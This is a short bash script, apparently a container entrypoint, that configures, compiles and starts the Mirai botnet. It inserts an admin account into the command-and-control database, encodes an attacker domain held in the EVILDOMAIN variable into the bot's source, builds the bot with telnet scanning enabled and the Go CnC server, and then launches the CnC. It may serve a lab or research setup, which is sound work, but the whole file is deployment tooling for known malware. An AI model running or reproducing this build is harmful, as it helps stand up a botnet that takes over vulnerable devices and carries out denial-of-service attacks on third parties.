#!/usr/bin/env bash

echo "INSERT INTO users VALUES (NULL, '$MIRAI_ADMIN_USERNAME', '$MIRAI_ADMIN_PASSWORD', 0, 0, 0, 0, -1, 1, 30, '');" \
>> db.sql

myenc string $EVILDOMAIN | sed 's/\\/\\\\/g' > test.txt\
      && export EVILDOMAIN_HEX=`cat test.txt` \
      && sed -i "s/insert_here/$EVILDOMAIN_HEX/g" source/bot/table.c \
      && rm test.txt

until mysql -h$MYSQL_HOST -uroot -p$MYSQL_PASSWORD < db.sql; do
  >&2 echo "Mysql is unavailable - sleeping"
  sleep 1
done

>&2 echo "Mysql is up - executing command"

gcc -std=c99 source/bot/*.c -DDEBUG "-DMIRAI_TELNET" \
                        -static -g -o source/debug/mirai.dbg \
    && go build -o source/debug/cnc source/cnc/*.go \
    && mv source/debug/* /root && mv source/prompt.txt /root && rm -rf source

cp mirai.dbg share/ && ./cnc
